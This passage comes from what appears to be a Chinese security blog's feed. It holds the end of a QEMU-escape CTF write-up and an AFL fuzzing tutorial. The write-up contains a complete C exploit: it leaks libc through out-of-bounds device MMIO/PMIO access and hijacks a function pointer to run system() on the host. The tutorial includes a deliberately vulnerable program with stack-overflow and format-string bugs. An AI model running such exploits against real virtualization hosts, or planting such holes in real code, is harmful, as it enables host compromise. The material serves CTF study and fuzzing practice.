opaque-&gt;seek = val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      key = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *key++ = (opaque-&gt;rand_r)(&amp;opaque-&gt;r_seed, <span class="number">28LL</span>, val, *&amp;size);</span><br><span class="line">      <span class="keyword">while</span> ( key != &amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *opaque-&gt;key = <span class="number">0LL</span>;</span><br><span class="line">      *&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里不说<code>pmio_read</code>函数了，因为确实没啥用就不浪费篇幅了。这里看<code>pmio_write</code>函数，可以喊到在port等于28时会给<code>r_seek</code>赋值，并且会调用<code>opaque-&gt;rand_r</code>第一个参数就是<code>opaque-&gt;r_seed</code>的地址。而在addr等于8并且val小于0x100时则是往seek中写入值。可以看出来这里漏洞一样是存在越界使用结构体。</p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>这里的利用思路也是较为清晰的</p><ol><li>  首先修改seek配合addr实现使用<code>mmio_write</code>函数实现越界写，将<code>opaque-&gt;rand_r</code>原有的函数地址进行tea加密并且写入到当前位置。</li><li>  两次调用<code>mmio_read</code>函数，分别读取<code>opaque-&gt;rand_r</code>高位和低位泄漏出libc地址，进而拿到system地址。</li><li>  应为<code>r_seek</code>成员和<code>blocks</code>成员紧邻的缘故，恢复seek为0并通过addr在<code>blocks</code>成员开始位置写入<code>flag</code></li><li>  最后直接调用<code>pmio_write</code>并且port为28修改<code>r_seed</code>为<code>nl /</code>即可调用<code>nl /flag</code></li></ol><h3 id="综上，exp-1"><a href="#综上，exp-1" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> port_base = <span class="number">0xc040</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">size_t</span> port, <span class="keyword">u_int32_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(val, port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">size_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">tea</span><span class="params">(<span class="keyword">size_t</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> v3;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v4;   <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">    <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    v3 = m;</span><br><span class="line">    v4 = <span class="number">-957401312</span>;</span><br><span class="line">    v5 = v3;</span><br><span class="line">    result = v3 &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        result = result - ((v5 + v4) ^ (key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">        v5 -= (result + v4) ^ (key[<span class="number">1</span>] + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)result &gt;&gt; <span class="number">5</span>)) ^ (key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">        v4 += <span class="number">1640531527</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (v4);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>, v5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>, result);</span><br><span class="line">    <span class="keyword">return</span> result &lt;&lt; <span class="number">32</span> | (<span class="keyword">u_int64_t</span>)v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/bus/pci/devices/0000:00:03.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;iopl fail!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> rand_r;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> libc_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> system_addr;</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>, <span class="number">0x100</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, <span class="number">0</span>);</span><br><span class="line">    rand_r = mmio_read(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    rand_r += ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)mmio_read(<span class="number">0x18</span>)) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    libc_base = rand_r - <span class="number">0x25d30</span>;</span><br><span class="line">    system_addr = libc_base + <span class="number">0x30290</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, rand_r);</span><br><span class="line"></span><br><span class="line">    key[<span class="number">0</span>] = pmio_read(<span class="number">12</span>);</span><br><span class="line">    key[<span class="number">1</span>] = pmio_read(<span class="number">16</span>);</span><br><span class="line">    key[<span class="number">2</span>] = pmio_read(<span class="number">20</span>);</span><br><span class="line">    key[<span class="number">3</span>] = pmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;key%d: %p\n&quot;</span>, i, key[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t_system_addr;</span><br><span class="line">    t_system_addr = tea(system_addr);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x18</span>, t_system_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, t_system_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>, <span class="number">0x67616c66</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">28</span>, <span class="number">0x2f206c6e</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230321154453844.png"                      alt="image-20230321154453844"                ></p><hr><p>题目链接:<br>    <a class="link"   href="https://github.com/196082/196082/tree/main/qemu_escape" >https://github.com/196082/196082/tree/main/qemu_escape<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;可以看得出来这篇文章的标题十分的水，因为确实是很难找到这两道题又什么闪光点来作为标题。这篇文章更新后会暂停学习qemu了，后续会进一步学习AFL以及开始接触docker逃逸。&lt;/p&gt;
&lt;h2 id=&quot;FastCP-ctf&quot;&gt;&lt;a href=&quot;#FastCP-ctf&quot; cla</summary>
      
    
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/categories/qemu-escape/"/>
    
    
    <category term="mmio" scheme="https://cv196082.gitee.io/tags/mmio/"/>
    
    <category term="pmio" scheme="https://cv196082.gitee.io/tags/pmio/"/>
    
  </entry>
  
  <entry>
    <title>FUZZ(1):初探AFL</title>
    <link href="https://cv196082.gitee.io/2023/03/18/%E5%88%9D%E6%8E%A2AFL/"/>
    <id>https://cv196082.gitee.io/2023/03/18/%E5%88%9D%E6%8E%A2AFL/</id>
    <published>2023-03-18T06:32:59.000Z</published>
    <updated>2023-03-18T07:33:05.013Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本篇文章主要是为网鼎杯线下赛做准备，不会涉及到AFL的原理，主要的方向为AFL的使用。</p><h2 id="AFL-FUZZ介绍"><a href="#AFL-FUZZ介绍" class="headerlink" title="AFL-FUZZ介绍"></a>AFL-FUZZ介绍</h2><p>AFL则是fuzzing的一个很好用的工具，全称是American Fuzzy Lop，由Google安全工程师Michał Zalewski开发的一款开源fuzzing测试工具，可以高效地对二进制程序进行fuzzing，挖掘可能存在的内存安全漏洞，如栈溢出、堆溢出、UAF、double free等。由于需要在相关代码处插桩，因此AFL主要用于对开源软件进行测试。当然配合QEMU等工具，也可对闭源二进制代码进行fuzzing，但执行效率会受到影响。</p><h2 id="白盒下的FUZZ"><a href="#白盒下的FUZZ" class="headerlink" title="白盒下的FUZZ"></a>白盒下的FUZZ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概流程：</p><p>首先是用afl-gcc编译源代码进行插桩，然后以测试文件为输入，然后启动afl-fuzz程序，将testcase作为程序的输入执行程序，afl会在这个testcase的基础上进行自动变异输入，使得程序产生crash，产生了crash就会被记录起来</p><h3 id="编译插桩"><a href="#编译插桩" class="headerlink" title="编译插桩"></a>编译插桩</h3><p>首先是面对上面这类小文件时采取的方法就是直接进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc -g -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure><p>但是面对编译项目时，大多会使用到Makefile。如果存在configure的话肯定是可以在里面直接进行修改，如果没有的话可以直接修改Makefile或者添加以下内容:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CC=/path/to/afl/afl-gcc</span><br><span class="line">CXX=/path/to/afl/afl-g++</span><br></pre></td></tr></table></figure><p> 当然面对clang或者clang++的话也是一样的。</p><h3 id="开始FUZZ"><a href="#开始FUZZ" class="headerlink" title="开始FUZZ"></a>开始FUZZ</h3><p>对那些可以直接从stdin读取输入的目标程序来说，语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</span><br></pre></td></tr></table></figure><p>对从文件读取输入的目标程序来说，要用“@@”，语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure><p>而对于这里命令为:<code>afl-fuzz -i input_dir -o output_dir ./test</code></p><p>其中-i选项时输入测试文件的目录，-o选项时输出结果文件的目录。</p><p>对于这个简单的例子，测试文件只需要随便输入点东西就行，这里选择输入<code>hello</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318133051229.png"                      alt="image-20230318133051229"                >一般会出现上图中的问题，解决办法就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line"><span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318134324644.png"                      alt="image-20230318134324644"                ></p><p>上图就是AFL的界面，上面的内容根据前面的注释基本可以猜出来一二，不过跑了十分钟只跑出了五处crash就挺离谱的，这个跑的结果与testcase和电脑性能以及运气都有一定关系。</p><h3 id="分析crashes"><a href="#分析crashes" class="headerlink" title="分析crashes"></a>分析crashes</h3><h4 id="id-000000-sig-06-src-000001-op-havoc-rep-128样例"><a href="#id-000000-sig-06-src-000001-op-havoc-rep-128样例" class="headerlink" title="id:000000,sig:06,src:000001,op:havoc,rep:128样例"></a><strong>id:000000,sig:06,src:000001,op:havoc,rep:128样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd id:000000,sig:06,src:000001,op:havoc,rep:128 </span><br><span class="line">00000000: 8001 8001 92a8 c3e4 c3c3 c3fa c3ea e4c3  ................</span><br><span class="line">00000010: c3c3 fac3 ea04 2310 0423 1000 1010 0000  ......<span class="comment">#..#......</span></span><br><span class="line">00000020: 9b00 1000 009b 0100 f5f5 0423 1000 1010  ...........<span class="comment">#....</span></span><br><span class="line">00000030: 0000 9b00 1000 009b 0100 f5f5 f5f5 f5f5  ................</span><br><span class="line">00000040: f5f5 f5f5 f5f5 f5f5 f5f5 00fa 0423 1000  .............<span class="comment">#..</span></span><br><span class="line">00000050: 1000 0000 20f5 0064 1000 009b 0010 0000  .... ..d........</span><br><span class="line">00000060: 9b01 0001 92fa 0023 1000 1000 0003 2300  .......<span class="comment">#......#.</span></span><br><span class="line">00000070: 6410 0000 9b15                           d.....</span><br></pre></td></tr></table></figure><p>可以猜测为栈溢出</p><h4 id="id-000001-sig-06-src-000001-op-havoc-rep-128样例"><a href="#id-000001-sig-06-src-000001-op-havoc-rep-128样例" class="headerlink" title="id:000001,sig:06,src:000001,op:havoc,rep:128样例"></a><strong>id:000001,sig:06,src:000001,op:havoc,rep:128样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd id:000001,sig:06,src:000001,op:havoc,rep:128 </span><br><span class="line">00000000: 7fb8 b7b8 207f 0001 7fb7 f9ff ffff f9ff  .... ...........</span><br><span class="line">00000010: ffff ff17 ffff ffff 7f7f 7fb7 f9ff ffff  ................</span><br><span class="line">00000020: f9ff ffff ff17 ffff ffff e0ff b8ff ffdd  ................</span><br><span class="line">00000030: b8b7 b8da 8008 00f9 fa00 00f9 f087 8080  ................</span><br><span class="line">00000040: 80ff f9ff ffff ff17 ffff ffff 7f7f 7fb7  ................</span><br><span class="line">00000050: f9ff ffff f9ff ffff ff17 ffff ffff ff80  ................</span><br><span class="line">00000060: 69b8 00d8 bdda 80b8 00d8 bdda ff7f 7fb8  i...............</span><br></pre></td></tr></table></figure><p>一样的应该也是栈溢出导致的</p><h4 id="id-000002-sig-11-src-000000-op-flip1-pos-1样例"><a href="#id-000002-sig-11-src-000000-op-flip1-pos-1样例" class="headerlink" title="id:000002,sig:11,src:000000,op:flip1,pos:1样例"></a><strong>id:000002,sig:11,src:000000,op:flip1,pos:1样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd id:000002,sig:11,src:000000,op:flip1,pos:1  </span><br><span class="line">00000000: 7425 7374                                t%st</span><br></pre></td></tr></table></figure><p>这里应该是格式化字符串漏洞引起的crash</p><h4 id="id-000003-sig-11-src-000000-op-havoc-rep-64样例"><a href="#id-000003-sig-11-src-000000-op-havoc-rep-64样例" class="headerlink" title="id:000003,sig:11,src:000000,op:havoc,rep:64样例"></a><strong>id:000003,sig:11,src:000000,op:havoc,rep:64样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd id:000003,sig:11,src:000000,op:havoc,rep:64 </span><br><span class="line">00000000: 4662 4062 4040 0000 8040 7f40 1000 4040  Fb@b@@...@.@..@@</span><br><span class="line">00000010: 6240 4000 7740 407f 4040 8040 403f 6565  b@@.w@@.@@.@@?ee</span><br><span class="line">00000020: 6565 4044 4040 3340 403f 6565 6565 4040  ee@D@@3@@?eeee@@</span><br><span class="line">00000030: 4040 3340 4040 4040 40                   @@3@@@@@@</span><br></pre></td></tr></table></figure><p>这里应该是以F开头且长度为6引起的crash</p><h4 id="id-000004-sig-11-src-000002-op-havoc-rep-8样例"><a href="#id-000004-sig-11-src-000002-op-havoc-rep-8样例" class="headerlink" title="id:000004,sig:11,src:000002,op:havoc,rep:8样例"></a><strong>id:000004,sig:11,src:000002,op:havoc,rep:8样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd id:000004,sig:11,src:000002,op:havoc,rep:8  </span><br><span class="line">00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA</span><br><span class="line">00000010: 4141 4141 1e41 4141 4141 4141 4141 4132  AAAA.AAAAAAAAAA2</span><br><span class="line">00000020: 4141 4141 4141 1e41 4141 4141 4141 4141  AAAAAA.AAAAAAAAA</span><br><span class="line">00000030: 4141 4141 4141 4141 4141 4141 412a 4134  AAAAAAAAAAAAA*A4</span><br><span class="line">00000040: 41b8                                     A.</span><br></pre></td></tr></table></figure><p>这里应该是以A开头并且长度为66引起的crash</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>可以看到上面五个样例基本覆盖了源码中存在的漏洞。</p><h2 id="黑盒下的FUZZ"><a href="#黑盒下的FUZZ" class="headerlink" title="黑盒下的FUZZ"></a>黑盒下的FUZZ</h2><blockquote><p>  黑盒模式需要使用qemu_mode，所以最好从开始就使用源码进行编译，这里可能会出现很多问题，大多都可以在网上搜到解决办法</p></blockquote><p>这里直接使用以下命令进行编译。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g ./test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h3 id="开始FUZZ-1"><a href="#开始FUZZ-1" class="headerlink" title="开始FUZZ"></a>开始FUZZ</h3><p>这里的FUZZ选项略有不同，需要加上-Q选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i ./input_dir -o ./output_dir -Q ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318141300808.png"                      alt="image-20230318141300808"                ></p><p>虽然可以看到这里被保存的crashes有6个，比上面的还多一个，但是看total crashes远远少于上面的。可以看出来用qemu的性能远远小于插桩的。</p><p>这里就不再分析输出的crashes文件了。</p><h2 id="文件读取输入的情况"><a href="#文件读取输入的情况" class="headerlink" 